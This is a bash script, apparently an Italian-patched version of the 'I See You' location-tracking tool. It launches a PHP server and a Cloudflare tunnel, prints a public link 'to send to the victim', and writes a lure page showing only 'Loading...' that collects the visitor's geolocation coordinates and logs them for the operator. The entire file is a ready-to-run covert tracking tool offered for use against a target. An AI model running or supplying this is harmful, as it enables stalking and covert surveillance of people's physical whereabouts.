#!/bin/bash

clear
echo "
██╗    ███████╗███████╗███████╗    ██╗   ██╗ ██████╗ ██╗   ██╗
██║    ██╔════╝██╔════╝██╔════╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║
██║    ███████╗█████╗  █████╗       ╚████╔╝ ██║   ██║██║   ██║
██║    ╚════██║██╔══╝  ██╔══╝        ╚██╔╝  ██║   ██║██║   ██║
██║    ███████║███████╗███████╗       ██║   ╚██████╔╝╚██████╔╝
╚═╝    ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ v2.0 ITA
[+] Original Author: Viral Maniar
[+] _DanyBit_ (patched for cloudflared)
"

sleep 1

echo "[*] Avvio del webserver locale (PHP)..."
php -S 127.0.0.1:8080 > php_server.log 2>&1 &
PHP_PID=$!
sleep 2

echo "[*] Avvio Cloudflared..."
cloudflared tunnel --url http://127.0.0.1:8080 > cloudflared.log 2>&1 &
CF_PID=$!
sleep 5

cloudflared_url=$(grep -o 'https://[a-zA-Z0-9.-]*trycloudflare.com' cloudflared.log | head -n 1)

if [ -z "$cloudflared_url" ]; then
    echo "[!] Errore: impossibile ottenere l'URL da Cloudflared."
    kill $PHP_PID $CF_PID 2>/dev/null
    exit 1
fi

echo "[+] Tunnel creato con successo!"
echo "[+] URL pubblico da inviare alla vittima:"
echo "    $cloudflared_url"
echo

# index.html
cat <<'EOF' > index.html
<!DOCTYPE html>
<html>
    <head>
        <title>I See You!</title>
        <style>
            body {
                background-color: #111;
                color: #0f0;
                text-align: center;
                font-family: monospace;
                padding-top: 100px;
            }
        </style>
    </head>
    <body>
        <h2>Loading...</h2>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
        <script>
        function sendLocation(lat, lon) {
            $.get("/logme.php?coords=" + lat + "," + lon);
        }
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    sendLocation(pos.coords.latitude, pos.coords.longitude);
                });
            }
        }
        $(document).ready(function(){
            getLocation();
        });
        </script>
    </body>
</html>
EOF

# logme.php
cat <<'EOF' > logme.php
<?php
if (isset($_GET['coords'])) {
    $coords = $_GET['coords'];
    file_put_contents("coords.log", date("Y-m-d H:i:s") . " - " . $coords . PHP_EOL, FILE_APPEND);
    echo "OK";
} else {
    echo "No data";
}
?>
EOF

touch coords.log

echo "[+] Pagina index.html e logme.php pronti in $(pwd)"
echo "[+] Logs richieste (CTRL+C per uscire):"
tail -f coords.log

# cleanup al termine
trap "kill $PHP_PID $CF_PID 2>/dev/null" EXIT

